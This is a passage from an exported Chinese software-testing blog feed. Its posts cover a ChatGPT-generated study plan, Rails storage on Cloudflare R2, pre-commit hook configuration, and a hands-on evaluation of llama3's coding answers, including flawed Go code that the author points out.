Custom Thread Groups、Throughput Shaping Timer）。 脚本优化\n学习如何优化性能测试脚本：减少冗余操作、合理配置线程组、使用集合点等。 了解如何处理动态数据和会话管理：关联（Correlation）和参数化（Parameterization）。 其他工具\n探索和学习其他性能测试工具：LoadRunner、Gatling、Locust。 对比不同工具的特点和使用场景，选择适合的工具进行实践。 第三季度：性能监控与瓶颈分析 性能监控\n学习性能监控的基本概念和方法。 使用监控工具：Grafana、Prometheus、New Relic、Dynatrace。 配置监控仪表盘，实时监控系统性能指标。 瓶颈分析\n了解性能瓶颈的常见类型：CPU、内存、网络、数据库等。 学习分析和识别性能瓶颈的方法。 使用工具进行性能剖析：JProfiler、VisualVM、Dynatrace 等。 优化与调优\n学习系统性能优化的基本方法和策略。 实践应用优化策略：数据库索引优化、缓存配置、代码优化、网络配置优化等。 第四季度：综合应用与实际项目 综合应用\n设计和实施全面的性能测试策略：覆盖负载测试、压力测试、容量测试和稳定性测试。 在实际项目中应用所学的性能测试技能，编写和执行复杂的性能测试脚本。 性能测试报告\n学习编写性能测试报告：包括测试背景、测试方法、测试结果、瓶颈分析、优化建议等。 学习如何向团队和管理层展示和解释性能测试结果。 新技术探索\n关注和学习性能测试的新技术和趋势。 探索分布式性能测试方法：使用云服务进行性能测试，如 BlazeMeter、AWS Performance Testing。 学习和应用 AI 在性能测试中的应用：自动化测试生成、智能分析等。 持续学习与社区参与 持续学习\n订阅和阅读相关技术博客、白皮书和行业报告。 参加线上和线下的技术会议、研讨会和讲座，如 Performance Summit、Testing Conferences 等。 社区参与\n积极参与性能测试社区，如 Stack Overflow、GitHub、Reddit 的性能测试板块。 参与开源项目，贡献代码或测试用例，提高实践能力。 与同行进行交流和分享，通过讨论和合作提高自身技能。 通过这个详细的学习计划，软件测试人员可以在 2024 年系统地学习和掌握性能测试，提高测试能力，提升职业竞争力。\n非常好了，通过 jmeter 这个工具把入门和提高都串联起来了，后面的部分有点糊弄，该深入的地方深不进去，不过要超过普通老师的水平了吧。\n总结 chatgpt 4o 制定的软件测试学习计划确实强到离谱了，特别是在入门和提升这两部分上，基本上接近甚至超过了一般培训老师的水平。后面的部分则显得深度不够以及流于车轱辘话，多样性不够，不过不影响这些计划的可用性。\n强，真的很强。\n","date":"2024-05-17T09:45:35+08:00","permalink":"zh.ethanhan.cc/p/chatgpt-4o-%E5%88%B6%E5%AE%9A%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92%E5%BC%BA%E5%88%B0%E7%A6%BB%E8%B0%B1/","title":"chatgpt 4o 制定的软件测试学习计划强到离谱"},{"content":"根据这篇文章一步一步来，基本上没啥问题。\n核心几个配置在下面。\nUse bin/rails credentials:edit to set Cloudflare credentials:\n1 2 3 4 5 cloudflare: account_id: ACCOUNT_ID access_key_id: YOUR_KEY secret_access_key: YOUR_SECRET bucket: BUCKET_NAME Now update config/storage.yml:\n1 2 3 4 5 6 7 cloudflare: service: S3 endpoint: https://\u0026lt;%= Rails.application.credentials.dig(:cloudflare, :account_id) %\u0026gt;.r2.cloudflarestorage.com access_key_id: \u0026lt;%= Rails.application.credentials.dig(:cloudflare, :access_key_id) %\u0026gt; secret_access_key: \u0026lt;%= Rails.application.credentials.dig(:cloudflare, :secret_access_key) %\u0026gt; region: auto bucket: \u0026lt;%= Rails.application.credentials.dig(:cloudflare, :bucket) %\u0026gt; And update ActiveStorage service in config/environments/development.rb:\n1 config.active_storage.service = :cloudflare ","date":"2024-05-14T11:10:46+08:00","permalink":"zh.ethanhan.cc/p/rails-activestorage-%E4%BD%BF%E7%94%A8-cloudflare-r2-%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8/","title":"Rails activestorage 使用 cloudflare R2 对象存储"},{"content":"不怕开发写 bug，就怕开发带私货，这应该是很多小伙伴都经历过的职场噩梦。目前看来一个比较好的方案就是在开发提交的时候进行一些自动化的检查，让夹带私货这件事情成本提高，从而减少这种情况的发生。\n1. 我们可以在代码提交时进行哪些检查 Linters：Linters 是分析源代码以找到编程问题、语法错误和其他潜在问题的工具。流行的例子包括 pylint、flake8 和 pyflakes。 代码格式化器：代码格式化器自动化根据预定义的样式约定格式化源代码的过程。示例包括 black、autopep8 和 yapf。 自动化测试：自动化测试，如单元和集成测试，对于确保代码的功能性和质量至关重要。框架如 unittest、pytest 和 nose 允许以自动化方式编写和运行测试。 静态代码分析：静态分析工具如 bandit（用于检测安全问题）、mypy（用于静态类型检查）和 prospector（集成了几个静态分析器）可以在不需要运行代码的情况下识别潜在问题。这些工具可以帮助找到安全漏洞、逻辑错误和可能的性能改进。 好的，那么……我们如何在我们的项目中应用这些测试/分析呢？别担心，这就是 Pre-commit 的用武之地。\n2. Pre-commit pre-commit 是一个用于管理和维护多语言 pre-commit 钩子的框架。我们称之为“钩子”的是一个脚本或一组命令，它们会自动执行。但是，我们什么时候要执行这些测试呢？\n这个工具允许我们配置一组质量测试，在运行 git 命令（commit、push 等）之前自动执行。这在某种意义上非常强大，因为每次我们修改 git 仓库时，我们都可以确保添加的代码遵循我们设定的质量规则。\n2.1 Pre-commit: 安装 要安装 pre-commit，首先执行以下命令行：\n1 pip install pre-commit 2.2 Pre-commit: 仓库结构 为了配置 pre-commit，我们需要 2 个文件，这些文件必须位于根文件夹中。这些文件是.pre-commit-config.yaml 和 pyproject.toml。\n1 2 3 4 project/ ├── src/ ├── .pre-commit-config.yaml └── pyproject.toml .pre-commit-config.yaml：必需。配置 QA 流水线。它包含要在执行 git 命令之前执行的每个钩子。 pyproject.toml：可选。配置文件，由打包工具以及其他工具（如 linters、类型检查器等）使用。它允许更具体的钩子配置。\n2.3 Pre-commit: QA 流水线 现在，让我们看看如何修改这些文件。首先，我们将看到一个简单的.pre-commit-config.yaml 配置示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 repos: - repo: https://github.com/pre-commit/pre-commit-hooks rev: v2.3.0 hooks: - id: check-yaml - id: end-of-file-fixer - id: trailing-whitespace - repo: https://github.com/astral-sh/ruff-pre-commit rev: v0.4.2 hooks: - id: ruff args: [ --fix ] - id: ruff-format 在这种情况下，我们定义了 5 个步骤（每个 ID 一个），其中前三个将检查 yaml 语法、文件结尾和尾随空格。最后两个钩子来自 Ruff（一个新的强大的 linter）。让我们了解文件的结构。\nrepo：存储库位于的 URL。否则可以是本地的，如果我们要执行自定义钩子。 rev：我们要使用的版本标签。 hooks：我们在其中指定我们要使用的该 repo 的所有钩子。 id：特定钩子的 ID。 对于每个钩子，我们可以指定更多参数，如 types、stages 等。我们可以在官方文档中查看列表。\n另一方面，有些工具还可以加入进来，所以，在这种情况下，我们将在 pyproject.toml 文件中更具体：\n1 2 3 4 5 6 # 其他Pyproject内容 # ... # Ruff钩子配置 [tool.ruff] line-length = 88 在这个示例中，我们配置了 Ruff，以强制我们的代码行长度不超过 88 个字符。要知道您可以在此文件中设置哪些配置，您将需要访问官方包网站并进行研究。\n2.4 Pre-commit: 执行 在执行它们之前，我们需要安装使用的钩子。Pre-commit 默认会在隔离的虚拟环境中安装所有来自钩子的依赖项，所以我们不必担心与我们的包发生冲突。这很酷！然而，如果我们想强制 pre-commit 使用与同一环境中安装的库，我们将需要强制所有执行的钩子都是自定义的（在下一节中解释）。\n因此，无论钩子是否使用隔离的 venv 来处理依赖项，我们都需要安装它们。为此，我们使用以下命令行：\n1 pre-commit install 之后，如果需要，我们可以安装额外的钩子类型。在这种情况下，我发现安装 commit-msg 和 pre-push 很有趣。这使我们能够在提交消息或进行推送之前配置自动执行。\n1 pre-commit install --hook-type commit-msg --hook-type pre-push 从现在开始，pre-commit 将监听所有 git 执行（commit、push 等）并将在其 stages 参数中定义的所有钩子执行。默认情况下，所有都设置为在每次 git 提交时执行。\n否则，我们可以使用以下命令行手动运行它：\n1 2 3 4 5 # 在一组文件上运行 pre-commit run --files file1 file2 ... # 在所有文件上运行 pre-commit run --all-files 2.5 自定义钩子 自定义钩子可以提供更加灵活和强大的检查。\n接下来是自定义钩子的实现（check_file_extensions.py）。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 import sys from pathlib import Path from typing import List import configargparse def check_file_extensions( file_extensions: List[Path], files: List[Path], ) -\u0026gt; List[Path]: \u0026#34;\u0026#34;\u0026#34; 查找具有不需要的格式的文件。 参数 ---------- file_extensions : List[Path] 我们要检查的扩展名。 files : List[Path] 要检查的文件。 返回 ------- List[Path] 返回具有不正确格式的文件列表。 \u0026#34;\u0026#34;\u0026#34; invalid_files = [] for file_path in files: if ( file_path.is_file() and file_path.suffix.lower() in file_extensions and not str(file_path).startswith(\u0026#34;.\u0026#34;) ): invalid_files.append(file_path) return invalid_files if __name__ == \u0026#34;__main__\u0026#34;: # 解析参数 parser = configargparse.ArgumentParser(description=\u0026#34;文件扩展名检查器\u0026#34;) parser.add_argument( \u0026#34;--formats\u0026#34;, nargs=\u0026#34;+\u0026#34;, required=True, help=\u0026#34;不需要的文件扩展名列表\u0026#34;, type=str.lower, ) parser.add_argument( \u0026#34;--files\u0026#34;, nargs=\u0026#34;+\u0026#34;, required=True, help=\u0026#34;文件列表\u0026#34;, type=Path, ) args = parser.parse_args() # 检查无效格式文件 invalid_files = check_file_extensions( args.formats, args.files, ) if invalid_files: print(\u0026#34;文件具有与以下不同的格式：\u0026#34;) for file_path in invalid_files: print(file_path) sys.exit(1) 一旦实现了钩子，它需要以以下方式添加到配置文件.pre-commit-config.yaml 中：\n1 2 3 4 5 6 7 8 9 10 11 12 13 repos: # 自定义钩子 - repo: local hooks: - id: my-custom-hook name: extension-file-checker entry: python qa_code/custom_hooks/check_file_extensions.py # 脚本路径 types: [file] language: system args: [\u0026#34;--formats\u0026#34;, \u0026#34;.json\u0026#34;, \u0026#34;--files\u0026#34;] require_serial: true pass_filenames: true stages: [commit, manual] 这个配置指定了以下内容：\nrepo: 由于它是本地的，定义了一个自定义钩子。 id: 显示的新钩子的 ID。 name: 显示的新钩子的名称。 entry: 执行钩子的命令。 language: 执行钩子的语言。设置为 system 将强制使用当前环境中安装的库。否则，pre-commit 将创建一个虚拟环境来安装必要的依赖项。 args: 脚本接收的参数。 require_serial: 强制执行不并行完成。 additional_dependencies: 启动钩子所需的依赖项。 pass_filenames: 定义是否将所有要分析的文件作为参数传递。 stages: 我们希望钩子在什么阶段执行 在这种情况下，每次我们想进行 git 提交时，也可以手动使用 pre-commit 命令。 3. Pre-commit 配置实例 下面一些钩子都比较实用。\ncheck-added-large-files：来自 Pre commit hooks。检查是否上传了大文件。 check-yaml：来自 Pre commit hooks。检查.yaml 文件是否正确编写。 check-toml：来自 Pre commit hooks。检查.toml 文件是否正确编写。 end-of-file-fixer：来自 Pre commit hooks。检查文件是否以新行结束。 trailing-whitespace：来自 Pre commit hooks。删除尾随空格。 ruff：来自 Ruff。运行代码质量检查。应用 PEP8 约定、语法错误、代码复杂性等检查。 ruff-format：来自 Ruff。根据特定样式自动格式化代码。一些示例包括：代码对齐、空白、行长度等。 numpydoc：来自 Numpydoc。验证 docstrings 是否符合 numpy 格式。 mypy：来自 Mypy。分析代码中与数据类型相关的错误，并在代码执行前提供可能的类型问题信息。 vulture：来自 Vulture。帮助识别不运行的代码，可能安全地删除。 commitizen：来自 Commitizen。用于确保确认消息遵循特定格式。 commitizen-branch：来自 Commitizen。用于确保分支名称遵循特定格式。 nbstripout：来自 Nbstripout。允许您在提交更改之前从 Jupyter 笔记本单元格中删除运行输出。 pytest-check：来自自定义钩子。使用 pytest 运行一组单元测试。 extension-file-checker：来自自定义钩子。允许您检查是否添加了具有特定扩展名的文件。 这是一个.pre-commit-config.yaml 例子。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 # 适用于python\u0026gt;=3.8的pre-commit配置文件 repos: - repo: local hooks: # Pre commit hooks https://github.com/pre-commit/pre-commit-hooks - id: check-added-large-files name: check for added large files description: prevents giant files from being committed. entry: check-added-large-files language: system args: [\u0026#39;--maxkb=123\u0026#39;] stages: [commit, manual] - id: check-yaml name: check yaml description: checks yaml files for parseable syntax. entry: check-yaml language: system types: [yaml] stages: [commit, manual] - id: check-toml name: check toml description: checks toml files for parseable syntax. entry: check-toml language: system types: [toml] stages: [commit, manual] - id: end-of-file-fixer name: fix end of files description: ensures that a file is either empty, or ends with one newline. entry: end-of-file-fixer language: system types: [python] exclude: ^data/mlruns/ stages: [commit, manual] - id: trailing-whitespace name: trim trailing whitespace description: trims trailing whitespace. entry: trailing-whitespace-fixer language: system types: [text] exclude: ^data/mlruns/ stages: [commit, manual] # Ruff hooks https://github.com/astral-sh/ruff-pre-commit - id: ruff # Linter name: ruff description: \u0026#34;Run \u0026#39;ruff\u0026#39; for extremely fast Python linting\u0026#34; entry: ruff check --force-exclude language: system require_serial: true types_or: [ python, pyi ] args: [ --fix] stages: [commit, manual] - id: ruff-format # Formatter name: ruff-format description: \u0026#34;Run \u0026#39;ruff format\u0026#39; for extremely fast Python formatting\u0026#34; entry: ruff format --force-exclude language: system exclude: \u0026#39;^(docs/|notebooks/demo_custom_argparse/)\u0026#39; types_or: [ python, pyi, jupyter ] require_serial: true stages: [commit, manual] # Numpy docstrings https://github.com/numpy/numpydoc - id: numpydoc-validation name: numpydoc-validation description: This hook validates that docstrings in committed files adhere to numpydoc standards. entry: python -m numpydoc.hooks.validate_docstrings require_serial: true language: system exclude: \u0026#39;^(docs/|notebooks/demo_custom_argparse/)\u0026#39; types: [python] 总结 总的来说下面这些钩子是完全可以用起来的。\n代码风格扫描，代码语法扫描，静态代码分析，代码自动格式化 配置文件扫描，比如 yaml 和 json 的语法扫描 文件保护扫描，一些核心文件我们不希望进行变动 自动化用例执行，一般情况下推荐执行单元测试，毕竟扫描的时候需要速度优先 ","date":"2024-05-10T09:27:45+08:00","permalink":"zh.ethanhan.cc/p/%E7%94%A8%E8%B5%B7%E6%9D%A5%E5%9C%A8%E6%8F%90%E4%BA%A4%E4%BB%A3%E7%A0%81%E6%97%B6%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E9%AA%8C%E8%AF%81/","title":"用起来，在提交代码时实现自动化验证"},{"content":"事情是这样的，前几天 facebook 发布了最新的llama3 模型，我第一时间就用ollama下载运行了一下，8b 模型的 size 很小，只有 4.6G 的样子，在我 16g 显存的台式机上，速度相当快，快到有点恍惚，现在的本地模型这么强了吗？\n本着判断本地模型唯一的标准就是让它做中英文翻译的原则，我让 llama3 翻译了几个英文句子，不意外，基本言不达意，完全不可用，然后就简单了，给它贴上不可用的标签，就在我的模型库里待着好了。\n然而几天后事情来了个 180 度大反转，我发现大家的测试结果都非常的正向，直呼这应该是目前为止最强的本地运行大模型了，有人测试了 70b 的版本，甚至把这个版本跟 gpt4 相提并论。\n这不科学呀，明明这玩意连英译中都搞不好，怎么可能评价这么高呢？\n本着试试不要钱的态度，我随便问了它几个跟自动化相关的问题，结果确实让人惊讶。\n首先 llama3 应该 95%的训练材料都是英文的( over 5% of the Llama 3 pretraining dataset consists of high-quality non-English data that covers over 30 languages)，所以中文不好无可厚非，跟其交互的时候最好用英文提问。于是我用蹩脚的英文问了它第一个问题。\n第一个问题 Open a browser using selenium and go to www.itest.info, then write a pytest assert to verify the page title should equal to 重定向科技, please give me the entile python code\n翻译过来就是打开浏览器，访问itest.info,然后用pytest写个断言，内容是浏览器的title应该等于重定向科技，直接给我python代码\n下面是 llama3 秒回的结果，真的是秒回，基本上刚敲完回车就开始炫了 😂。\nHere is the Python code that uses Selenium WebDriver with Pytest to open a browser, navigate to www.itest.info, and assert that the page title equals \u0026ldquo;重定向科技\u0026rdquo;:\n1 2 3 4 5 6 7 8 9 10 11 12 import pytest from selenium import webdriver @pytest.fixture def browser(): driver = webdriver.Chrome() # Replace with your preferred browser yield driver driver.quit() def test_itest_info(browser): browser.get(\u0026#34;https://www.itest.info\u0026#34;) assert browser.title == \u0026#34;重定向科技\u0026#34; Let me explain what each line does:\nimport pytest: We\u0026rsquo;re using Pytest for our testing framework. from selenium import webdriver: We\u0026rsquo;re importing the Selenium WebDriver library. @pytest.fixture: This is a Pytest fixture, which sets up and tears down resources (in this case, a browser instance) for each test. def browser():: The fixture function returns a browser object, which we\u0026rsquo;ll use to interact with the website. driver = webdriver.Chrome(): We\u0026rsquo;re creating a new Chrome browser instance (replace with your preferred browser if needed). yield driver: This is where the browser instance is yielded back to the test function. browser.quit(): After the test is finished, we\u0026rsquo;ll close the browser instance using the quit() method. def test_itest_info(browser):: Our actual test function takes a browser instance as an argument. browser.get(\u0026quot;https://www.itest.info\u0026quot;): We\u0026rsquo;re navigating to the website using the get() method. assert browser.title == \u0026quot;重定向科技\u0026quot;: We\u0026rsquo;re asserting that the page title is equal to \u0026ldquo;重定向科技\u0026rdquo;. If this assertion fails, Pytest will raise an exception. To run this code, save it in a file (e.g., itest_test.py) and then run it using Pytest:\n1 $ pytest itest_test.py This should execute the test and report any failures or errors.\n怎么说呢，不仅写的比我快，而且写的还比我好，不仅写的比我好，还解释了一大堆，都说言多必失，不过它的解释似乎没啥问题。\n第二个问题 then click a button with id = 12345\n接下来点击一个 id 为 12345 的 button\n依然秒回，现在的大模型，性子都那么急。\nHere is the updated code that clicks a button with an ID of 12345 after navigating to the website:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import pytest from selenium import webdriver @pytest.fixture def browser(): driver = webdriver.Chrome() # Replace with your preferred browser yield driver driver.quit() def test_itest_info(browser): browser.get(\u0026#34;https://www.itest.info\u0026#34;) # Find and click the button with ID 12345 button = browser.find_element_by_id(\u0026#34;12345\u0026#34;) button.click() assert browser.title == \u0026#34;重定向科技\u0026#34; Here\u0026rsquo;s what\u0026rsquo;s new:\nWe use browser.find_element_by_id() to locate an element (in this case, a button) with the specified ID (12345). We store the found element in the button variable. We call the click() method on the button to simulate clicking it. Note that if there are multiple elements on the page with the same ID, Selenium will throw an exception when trying to find the element. To avoid this, you can use more specific locator strategies (e.g., CSS selectors or XPath expressions) or ensure that the ID is unique on the page.\n终于出问题了，find_element_by_id是老的接口，这样写几年前没问题，但现在就不行了，目前比较通用的写法是使用By.ID这种形式。\n第三个问题 The code above is not correct, please use By.ID to refactor it.\n上面的代码不对，请使用 By.ID 来进行重构。\n嗯，还是秒回，这回习惯了。\nI apologize for the mistake! Here is the corrected code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import pytest from selenium import webdriver from selenium.webdriver.common.by import By @pytest.fixture def browser(): driver = webdriver.Chrome() # Replace with your preferred browser yield driver driver.quit() def test_itest_info(browser): browser.get(\u0026#34;https://www.itest.info\u0026#34;) # Find and click the button with ID 12345 using By.ID button = browser.find_element(by=By.ID, value=\u0026#34;12345\u0026#34;) button.click() assert browser.title == \u0026#34;重定向科技\u0026#34; I\u0026rsquo;ve refactored the code to use the By class from Selenium\u0026rsquo;s webdriver.common.by module, which provides a more explicit way of specifying the locator strategy. In this case, we\u0026rsquo;re using By.ID to locate the element by its ID.\nNote that I also replaced find_element_by_id() with find_element(by=By.ID, value=\u0026quot;12345\u0026quot;), which is the recommended way to use the new locator strategy.\nllama3 不仅道歉了，还改正了结果。如果这是 chatgpt3.5 或者 claude3，这就是基本操作，没啥大不了的，但对于一个本地运行的模型来说，这种表现实在是非常可以了。\n有初步结论了 看来 llama3 在解决编程问题上是属于可用的状态。\n对于一般的开发人员来说，我们可以从面相 google 的编程慢慢转变为部分面相本地 llm 的编程模式了。 对于企业来说，本地的 llm 不存在把代码传到远程的问题，信息安全性的问题可以部分解决了。 对于测试人员来说，会一些基本的编程技巧就可以实现使用自然语言进行测试用例编写的能力了。这是之前很多年大家追求的目标，现在一个本地 4.6g 的模型基本可以让我们摸到一点点边了； 对于质量管理来说，用本地 llm 跟开发人员进行结对编程似乎也有了可能性，开发人员写代码，llm 生成单元测试代码，也许只要通过微调就可以部分实现； 试一试稍微难一点的问题 using go access this api https://api.dictionaryapi.dev/api/v2/entries/en/, then print the all the meannings from the response, the respinse is a json string, it is like [ { \u0026quot;word\u0026quot;: \u0026quot;hello\u0026quot;, \u0026quot;phonetic\u0026quot;: \u0026quot;həˈləʊ\u0026quot;, \u0026quot;phonetics\u0026quot;: [ { \u0026quot;text\u0026quot;: \u0026quot;həˈləʊ\u0026quot;, \u0026quot;audio\u0026quot;: \u0026quot;//ssl.gstatic.com/dictionary/static/sounds/20200429/hello--_gb_1.mp3\u0026quot; }, { \u0026quot;text\u0026quot;: \u0026quot;hɛˈləʊ\u0026quot; } ], \u0026quot;origin\u0026quot;: \u0026quot;early 19th century: variant of earlier hollo ; related to holla.\u0026quot;, \u0026quot;meanings\u0026quot;: [ { \u0026quot;partOfSpeech\u0026quot;: \u0026quot;exclamation\u0026quot;, \u0026quot;definitions\u0026quot;: [ { \u0026quot;definition\u0026quot;: \u0026quot;used as a greeting or to begin a phone conversation.\u0026quot;, \u0026quot;example\u0026quot;: \u0026quot;hello there, Katie!\u0026quot;, \u0026quot;synonyms\u0026quot;: [], \u0026quot;antonyms\u0026quot;: [] } ] }, { \u0026quot;partOfSpeech\u0026quot;: \u0026quot;noun\u0026quot;, \u0026quot;definitions\u0026quot;: [ { \u0026quot;definition\u0026quot;: \u0026quot;an utterance of ‘hello’; a greeting.\u0026quot;, \u0026quot;example\u0026quot;: \u0026quot;she was getting polite nods and hellos from people\u0026quot;, \u0026quot;synonyms\u0026quot;: [], \u0026quot;antonyms\u0026quot;: [] } ] }, { \u0026quot;partOfSpeech\u0026quot;: \u0026quot;verb\u0026quot;, \u0026quot;definitions\u0026quot;: [ { \u0026quot;definition\u0026quot;: \u0026quot;say or shout ‘hello’.\u0026quot;, \u0026quot;example\u0026quot;: \u0026quot;I pressed the phone button and helloed\u0026quot;, \u0026quot;synonyms\u0026quot;: [], \u0026quot;antonyms\u0026quot;: [] } ] } ] } ]\n用 golang 去访问 1 个 api，然后打印返回值里的 meanings 字段，这里 meannings 字段比较复杂，处理起来有点点麻烦。\n这时候 llama3 的回答就有意思了。\nHere is a sample Go program that sends an HTTP request to the API, parses the JSON response, and prints out all the meanings:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 package main import ( \u0026#34;bytes\u0026#34; \u0026#34;encoding/json\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;io/ioutil\u0026#34; \u0026#34;net/http\u0026#34; ) func main() { // Set the word you want to look up word := \u0026#34;hello\u0026#34; // Make an HTTP request to the API url := fmt.Sprintf(\u0026#34;https://api.dictionaryapi.dev/api/v2/entries/en/%s\u0026#34;, word) resp, err := http.Get(url) if err != nil { panic(err) } defer resp.Body.Close() // Read the response body body, err := ioutil.ReadAll(resp.Body) if err != nil { panic(err) } // Unmarshal the JSON response var data []map[string]interface{} err = json.Unmarshal(body, \u0026amp;data) if err != nil { panic(err) } // Print out all the meanings for _, entry := range data { for _, meaning := range entry[\u0026#34;meanings\u0026#34;].([]interface{}) { fmt.Println(\u0026#34;Part of speech:\u0026#34;, (meaning.(map[string]interface{}))[\u0026#34;partOfSpeech\u0026#34;]) for _, definition := range (meaning.(map[string]interface{}))[\u0026#34;definitions\u0026#34;].([]interface{}) { fmt.Println(\u0026#34;Definition:\u0026#34;, definition.(map[string]interface{})[\u0026#34;definition\u0026#34;]) if example, ok := definition.(map[string]interface{})[\u0026#34;example\u0026#34;]; ok { fmt.Println(\u0026#34;Example:\u0026#34;, example) } if synonyms, ok := definition.(map[string]interface{})[\u0026#34;synonyms\u0026#34;]; ok \u0026amp;\u0026amp; len(synonyms.([]interface{})) \u0026gt; 0 { fmt.Println(\u0026#34;Synonyms:\u0026#34;, synonyms) } } } } } This program sends an HTTP GET request to the API with the specified word, reads the response body, and then unmarshals it into a slice of maps. It then iterates over this slice and prints out all the meanings.\nPlease note that you should handle the error cases more robustly in production code. This is just a sample program.\n我没运行代码，不过看上去可能是跑得起来的。不过很显然这种实现方式不是很妙呀。\n继续让它用 struct 来重构。\nrefactor the above code, use a struct to parse the json string\n这时候 llama3 应该是混乱了。\nHere\u0026rsquo;s how you can refactor the above code using structs:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 package main import ( \u0026#34;encoding/json\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;io/ioutil\u0026#34; \u0026#34;net/http\u0026#34; ) type Meaning struct { PartOfSpeech string `json:\u0026#34;partOfSpeech\u0026#34;` _DEFINITIONS []Definition `json:\u0026#34;definitions\u0026#34;` } type Definition struct { Definition string `json:\u0026#34;definition\u0026#34;` Example string `json:\u0026#34;example,omitempty\u0026#34;` Synonyms []string `json:\u0026#34;synonyms,omitempty\u0026#34;` Antonyms []string `json:\u0026#34;antonyms,omitempty\u0026#34;` } func main() { word := \u0026#34;hello\u0026#34; url := fmt.Sprintf(\u0026#34;https://api.dictionaryapi.dev/api/v2/entries/en/%s\u0026#34;, word) resp, err := http.Get(url) if err != nil { panic(err) } defer resp.Body.Close() body, err := ioutil.ReadAll(resp.Body) if err != nil { panic(err) } var data []Entry err = json.Unmarshal(body, \u0026amp;data) if err != nil { panic(err) } for _, entry := range data { fmt.Println(\u0026#34;Word:\u0026#34;, entry.Word) for _, meaning := range entry.Meanings { fmt.Println(\u0026#34;Part of speech:\u0026#34;, meaning.PartOfSpeech) for _, definition := range meaning._DEFINITIONS { fmt.Println(\u0026#34;Definition:\u0026#34;, definition.Definition) if definition.Example != \u0026#34;\u0026#34; { fmt.Println(\u0026#34;Example:\u0026#34;, definition.Example) } if len(definition.Synonyms) \u0026gt; 0 { fmt.Println(\u0026#34;Synonyms:\u0026#34;, definition.Synonyms) } if len(definition.Antonyms) \u0026gt; 0 { fmt.println(\u0026#34;Antonyms:\u0026#34;, definition.Antonyms) } } } } } type Entry struct { Word string `json:\u0026#34;word\u0026#34;` Pronunciation string `json:\u0026#34;phonetic\u0026#34;` Pronunciations []Pronunciation `json:\u0026#34;phonetics\u0026#34;` Origin string `json:\u0026#34;origin\u0026#34;` Meanings []Meaning `json:\u0026#34;meanings\u0026#34;` } type Pronunciation struct { Text string `json:\u0026#34;text\u0026#34;` Audio string `json:\u0026#34;audio\u0026#34;` } In this code, I\u0026rsquo;ve defined three structs: Meaning, Definition, and Entry. The Meaning struct has a part of speech and a slice of definitions. The Definition struct has a definition, example, synonyms, and antonyms. The Entry struct has a word, pronunciation, origin, and meanings.\nI then used these structs to unmarshal the JSON response from the API. This makes the code more readable and easier to maintain, as it separates the logic of parsing the JSON into its constituent parts from the logic of printing out the results.\n意思对了，但是代码不够准确，稍微复杂一点的代码，llama3 处理起来还是有难度的。\n结论 测试人员福音，很多公司访问不了 chatgpt 等国外的 ai 站点，用这个本地写写简单的测试用例还是有搞头的，很多测试同学的代码能力其实并不强，可以用本地 llm 来帮忙检查代码或者生成部分代码，应该能节约不少时间。\n本文用到的工具 ollama openwebui Raycast llama3 插件 vscode continue 插件 彩蛋 这是我不小心发现的 1 个软件测试的 system prompt，有兴趣的同学可以试试。\n1 2 3 4 5 6 7 SYSTEM \u0026#34;\u0026#34;\u0026#34; As a certified Software Testing expert, I am equipped to provide comprehensive assistance in Software Testing using official ISTQB terminology and methodologies. My expertise encompasses roles such as Test Analyst, Technical Test Analyst and Test Manager. I offer training and education in Software Testing, providing in-depth knowledge and practical insights. As specialist, I interactively assist organizations in implementing robust test processes, concepts and strategies step by step. Additionally, I support individuals in their day-to-day software testing tasks, carrying out work steps, offering expert advice and solutions tailored to specific software testing challenges. For example, clients may provide test cases, requirements documentation and bug reports to aid in the testing process. To streamline my assistance, I recommend that clients upload relevant work items using Open WebUI with document upload support \u0026lt;https://docs.openwebui.com\u0026gt;. Alternatively, text input can be provided when Open WebUI is not available. For adherence to ISTQB standards, clients are encouraged to use Open WebUI together with glossary, syllabus, and text exam documents uploaded from \u0026lt;https://www.istqb.org/certifications/\u0026gt;. This will ensure that my assistance is aligned with the latest industry best practices and standards. Together, we can achieve exceptional results in Software Testing. \u0026#34;\u0026#34;\u0026#34; ","date":"2024-04-25T22:14:17+08:00","permalink":"zh.ethanhan.cc/p/%E7%A0%B4%E9%98%B2%E4%BA%86%E6%88%91%E7%94%A8%E6%9C%AC%E5%9C%B0%E8%BF%90%E8%A1%8C%E7%9A%84ai%E5%86%99%E4%BB%A3%E7%A0%81%E6%84%9F%E8%A7%89%E5%AE%83%E6%AF%94%E6%88%91%E5%8E%89%E5%AE%B3%E5%A4%9A%E4%BA%86/","title":"破防了，我用本地运行的ai写代码，感觉它比我厉害多了"},{"content":"之前一直搞不定 https，今天看了一眼发现是自己配置错了，顺手记录一下，反正 kamal 每次部署都是常用常新，因为 kamal 深度绑定了 traefik，所以两种配置混在一起，理解起来有一点难度，所以过段时间再去配置，就会有点陌生感。\n最重要的一点，更新 credentials 因为 kamal 的.env文件里需要有 master key 和 secert key，前者需要用来解密 credentials，后者保存在 credentials 里面，所以先直接生成一个，防止 docker build 的时候出错。\n1 2 rm config/credentials.yml.enc EDITOR=\u0026#34;code --wait\u0026#34; bin/rails 